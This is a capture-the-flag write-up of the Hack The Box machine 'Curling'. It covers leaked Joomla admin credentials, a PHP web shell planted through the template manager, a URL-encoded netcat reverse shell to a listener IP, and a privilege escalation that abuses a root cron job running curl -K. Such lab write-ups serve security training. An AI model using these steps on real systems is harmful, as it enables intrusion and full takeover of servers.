# Curling Writeup - by Thammanant Thamtaranon  
- Curling is an easy Linux-based machine hosted on Hack The Box.

## Reconnaissance  
- I began with a full TCP port scan including service/version detection and OS fingerprinting:  
  `nmap -A -T4 -p- -Pn 10.10.10.150`  
  ![Nmap_Scan](Nmap_Scan.png)  
- The scan revealed the following open ports:  
  - **22** — SSH  
  - **80** — HTTP  

## Scanning & Enumeration  
- From the Nmap scan, we identified that the CMS is **Joomla**, so we conducted enumeration using Joomscan:  
  `joomscan --url 10.10.10.150 --enumerate-components`  
  ![Joom_Scan](Joom_Scan.png)  
- Joomscan did not reveal any critical findings.

## Exploitation  
- Visiting the webpage and reading the blog revealed the username **Floris**.  
- Inspecting the HTML source code disclosed a file named `secret.txt`.  
  ![Secret](Secret.png)  
- Navigating to `http://10.10.10.150/secret.txt` revealed an encoded string.  
  ![Password](Password.png)  
- Decoding the string in CyberChef showed that it was Base64-encoded credentials.  
  ![CyberChef](CyberChef.png)  
- Using these credentials, I logged into the Joomla administrator panel at `/administrator`.  
  ![Home](Home.png)  
- We navigated to the Template Manager → selected a template → created a new file with a `.php` extension → inserted a PHP web shell → and saved it.  
  ![Webshell1](Webshell1.png)  
- Accessing the web shell via  
  `http://10.10.10.150/templates/beez3/shell.php?cmd=id`  
  confirmed remote command execution.  
  ![Webshell2](Webshell2.png)  
- We executed a reverse shell payload:  
  `rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.16.3%204444%20%3E%2Ftmp%2Ff`  
  and successfully obtained a reverse shell.  
  ![Reverse_Shell](Reverse_Shell.png)  
- Navigating to `/home/floris`, we found a file named `password_backup`.  
  ![Password_Backup](Password_Backup.png)  
- Decoding it in CyberChef revealed Floris’s SSH password.  
  ![SSH_Password](SSH_Password.png)  
- We then authenticated via SSH as Floris.  
  ![Floris](Floris.png)  
- The user flag was retrieved.

## Privilege Escalation  
- Running `sudo -l` confirmed that Floris did not have sudo privileges.  
- We uploaded the static version of **pspy64** to monitor running processes.  
- pspy revealed a recurring cron job executing:  
  **`curl -K`**  
  ![CURL](CURL.png)  
- We compiled a custom binary `root.c` using:  
  `gcc -o root root.c -static`  
  The `-static` flag was used to avoid the previous error:  
  `/lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.34' not found`  
  ![Root1](Root1.png)  
- We then modified the `input` file used by the curl `-K` option to execute our malicious binary.  
  ![Root2](Root2.png)  
  ![Root3](Root3.png)  
- After triggering the cron execution by running `/bin/ping`, we obtained a root shell.  
  ![Root4](Root4.png)  
- We captured the root flag.
